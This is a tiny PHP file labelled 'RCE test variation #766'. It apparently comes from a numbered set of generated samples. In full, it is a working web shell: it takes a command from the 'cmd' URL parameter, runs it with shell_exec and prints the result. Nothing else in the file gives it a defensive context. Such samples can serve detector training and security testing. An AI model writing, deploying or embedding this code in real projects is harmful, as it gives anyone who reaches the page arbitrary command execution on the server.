<?php
// RCE test variation #766
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>